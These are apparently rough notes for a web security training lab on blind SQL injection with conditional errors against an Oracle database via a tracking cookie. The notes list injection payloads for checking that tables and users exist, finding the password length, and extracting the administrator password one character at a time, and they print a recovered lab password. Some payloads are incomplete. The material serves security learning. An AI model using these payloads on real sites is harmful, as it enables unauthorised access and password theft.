Lab #12 - Blind SQL injection with conditional errors

Vulnerable parameter - tracking cookie

End Goals:
- Output the administrator password
- Login as the administrator user

Analysis:

1) Prove that parameter is vulnerable

' || (select '' from dual) || ' -> oracle database

' || (select '' from dualfiewjfow) || ' -> error

2) Confirm that the users table exists in the database

' || (select '' from users where rownum =1) || ' 
-> users table exists

3) Confirm that the administrator user exists in the users table
' || (select '' from users where username='administrator') || ' 


' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
-> Internal server error -> administrator user exists

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
-> 200 response -> user does not exist in database

4) Determine length of password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
-> 200 response at 50 -> length of password is less than 50
-> 20 characters

5) Output the administrator password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
-> w is not the first character of the password

wjuc497wl6szhbtf0cbf


script.py <url>